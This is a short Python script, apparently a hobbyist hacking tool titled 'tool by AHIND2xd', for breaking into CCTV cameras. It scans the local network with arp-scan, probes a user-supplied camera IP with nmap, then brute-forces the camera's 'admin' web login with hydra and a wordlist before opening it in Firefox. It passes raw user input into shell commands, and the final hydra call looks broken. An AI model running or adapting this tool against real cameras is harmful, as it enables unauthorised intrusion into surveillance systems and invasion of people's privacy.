import subprocess
import colorama
from colorama import Fore, Back, Style
import time
print("Wait.......")
time.sleep(3)
print(Fore.RED +""""

    .___________             .___
  __| _/\_____  \ ___  ___ __| _/
 / __ |  /  ____/ \  \/  // __ | 
/ /_/ | /       \  >    </ /_/ | 
\____ | \_______ \/__/\_ \____ | 
     \/         \/      \/    \/ 
     tool by AHIND2xd
""")
print(Fore.BLUE +"---------connect to the network------------")
wifi = input(Fore.YELLOW+"Enter Your network interface card(eg:wlan0): " )
print(Fore.RED +"")
command = f"sudo arp-scan --interface {wifi} -l"
subprocess.run(command ,shell=True ,check=True)
time.sleep(3)
input4=input("Enter your Word list location : " )
input1 = input(Fore.LIGHTBLUE_EX+"Enter the cctv camera ip : " )
command1 = f"nmap {input1} "
subprocess.run(command1 ,shell=True,check=True)

print(Fore.YELLOW+".............................")
print("Cracking password")
time.sleep(2)
print("")
command3 = f"hydra -l admin -P {input4} -f {input1} http-get /"
print(Fore.RED +"cracking")
subprocess.run(command3 ,shell=True ,check=True)
command2 = f"firefox {input1}"
subprocess.run(command2 ,shell=True ,check=True)
time.sleep(15)
print(Fore.YELLOW+".............................")
print("Cracking password")
time.sleep(2)
print("")
command3 = f"hydra -l admin -P {input4} -f {input1} http-get "
subprocess.run(command3)
print(Fore.RED +"cracking")
